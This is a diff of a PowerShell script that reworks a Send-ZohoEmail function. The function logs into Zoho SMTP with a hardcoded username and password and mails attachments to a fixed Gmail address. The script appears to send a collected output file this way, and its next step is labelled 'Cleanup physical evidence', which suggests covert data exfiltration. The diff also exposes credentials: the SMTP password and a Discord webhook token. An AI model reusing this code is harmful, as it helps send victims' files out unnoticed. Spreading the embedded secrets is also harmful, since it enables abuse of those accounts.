@@ -23,63 +23,109 @@ function Send-EmailNotification {
     }
 }
 
+# function Send-ZohoEmail {
+#     param (
+#         [string]$FromEmail = "zqrvstef0rc5edk@zohomail.com",
+#         [string]$ToEmail = "srve650@gmail.com",
+#         [string]$Subject,
+#         [string]$Body = "Hello, this is a test email with an attachment.",
+#         # [string[]]$Attachments = @(),  # Optional parameter for attachments
+#         [PSObject[]]$Attachments = @(),
+#         [string]$SmtpServer = "smtp.zoho.com",
+#         [int]$Port = 587,
+#         [string]$Username = "zqrvstef0rc5edk@zohomail.com",
+#         [string]$Password = "LHjzKTbzDApt"
+#     )
+
+#     $email_webhookUrl = "https://discord.com/api/webhooks/1300835436918341745/yAGXpLFdBLnxfyQzn0wncm3rKsy3_m9mqc1KstctEIp25zs3iByJyNgEG036Oh7ENGMu"
+
+#     # Create the email message
+#     $mailMessage = New-Object System.Net.Mail.MailMessage
+#     $mailMessage.From = $FromEmail
+#     $mailMessage.To.Add($ToEmail)
+#     $mailMessage.Subject = $Subject
+#     $mailMessage.Body = $Body
+
+#     # Attach logic that handles BOTH physical files and Memory Objects
+# foreach ($item in $Attachments) {
+#     # Check if the item is already a pre-built Attachment object
+#     if ($item.GetType().FullName -eq "System.Net.Mail.Attachment") {
+#         $mailMessage.Attachments.Add($item)
+#     }
+#     # Check if the item is a string (a path) and if that file exists
+#     elseif ($item -is [string] -and (Test-Path $item)) {
+#         $fileAttach = New-Object System.Net.Mail.Attachment($item)
+#         $mailMessage.Attachments.Add($fileAttach)
+#     } 
+#     else {
+#         # This triggers if it's a string that doesn't exist OR a bad object
+#         Write-Host "Warning: Invalid attachment or file not found - $item" -ForegroundColor Yellow
+#     }
+# }
+
+#     # Configure the SMTP client
+#     $smtpClient = New-Object Net.Mail.SmtpClient($SmtpServer, $Port)
+#     $smtpClient.EnableSsl = $true
+#     $smtpClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)
+
+#     # Send the email
+#     try {
+#         Write-Host "Sending Email via Zoho.... please wait..."
+#         $smtpClient.Send($mailMessage)
+#         Write-Host "Email sent successfully."
+#         $message = "Email sent successfully to $ToEmail. " + $Subject
+#         Send-EmailNotification -ToEmail $ToEmail -WebhookUrl $email_webhookUrl -Message $message
+#         # SetEmailSentTrue # Ensure this function is defined elsewhere in your script
+#     } catch {
+#         Write-Host "Error sending email: $($_.Exception.Message)" -ForegroundColor Red
+#         # SetEmailSentFalse
+#     } finally {
+#         # Clean up
+#         $mailMessage.Dispose()
+#         $smtpClient.Dispose()
+#     }
+# }
+
+
 function Send-ZohoEmail {
     param (
         [string]$FromEmail = "zqrvstef0rc5edk@zohomail.com",
         [string]$ToEmail = "srve650@gmail.com",
         [string]$Subject,
         [string]$Body = "Hello, this is a test email with an attachment.",
-        [string[]]$Attachments = @(),  # Optional parameter for attachments
+        [PSObject[]]$Attachments = @(), # MUST BE PSObject
         [string]$SmtpServer = "smtp.zoho.com",
         [int]$Port = 587,
         [string]$Username = "zqrvstef0rc5edk@zohomail.com",
         [string]$Password = "LHjzKTbzDApt"
     )
 
-    $email_webhookUrl = "https://discord.com/api/webhooks/1300835436918341745/yAGXpLFdBLnxfyQzn0wncm3rKsy3_m9mqc1KstctEIp25zs3iByJyNgEG036Oh7ENGMu"
-
-    # Create the email message
     $mailMessage = New-Object System.Net.Mail.MailMessage
     $mailMessage.From = $FromEmail
     $mailMessage.To.Add($ToEmail)
     $mailMessage.Subject = $Subject
     $mailMessage.Body = $Body
 
-    # Attach logic updated to be more "forgiving"
     foreach ($item in $Attachments) {
-        # Check if it's already an Attachment object
-        if ($item.GetType().FullName -eq "System.Net.Mail.Attachment") {
+        if ($null -eq $item) { continue }
+        
+        # Logic to distinguish between Object and File Path
+        if ($item.GetType().FullName -like "*Attachment*") {
             $mailMessage.Attachments.Add($item)
         }
-        # Check if it's a valid file path string
         elseif ($item -is [string] -and (Test-Path $item)) {
-            $attachment = New-Object System.Net.Mail.Attachment($item)
-            $mailMessage.Attachments.Add($attachment)
-        } 
-        else {
-            # This is where your error is currently triggering
-            Write-Host "Warning: Invalid attachment or file not found - $($item.GetType().Name)" -ForegroundColor Yellow
+            $mailMessage.Attachments.Add((New-Object System.Net.Mail.Attachment($item)))
         }
     }
 
-    # Configure the SMTP client
     $smtpClient = New-Object Net.Mail.SmtpClient($SmtpServer, $Port)
     $smtpClient.EnableSsl = $true
     $smtpClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)
 
-    # Send the email
     try {
-        Write-Host "Sending Email via Zoho.... please wait..."
         $smtpClient.Send($mailMessage)
-        Write-Host "Email sent successfully."
-        $message = "Email sent successfully to $ToEmail. " + $Subject
-        Send-EmailNotification -ToEmail $ToEmail -WebhookUrl $email_webhookUrl -Message $message
-        # SetEmailSentTrue # Ensure this function is defined elsewhere in your script
-    } catch {
-        Write-Host "Error sending email: $($_.Exception.Message)" -ForegroundColor Red
-        # SetEmailSentFalse
+        Write-Host "Success!" -ForegroundColor Green
     } finally {
-        # Clean up
         $mailMessage.Dispose()
         $smtpClient.Dispose()
     }
@@ -149,7 +195,6 @@ if (Test-Path $outputFilePath) {
 
     # Use @() to ensure it stays an array of objects
     Send-ZohoEmail -Subject $subject -Attachments @($attachment)
-
     
     # 6. Cleanup physical evidence
     $attachment.Dispose()
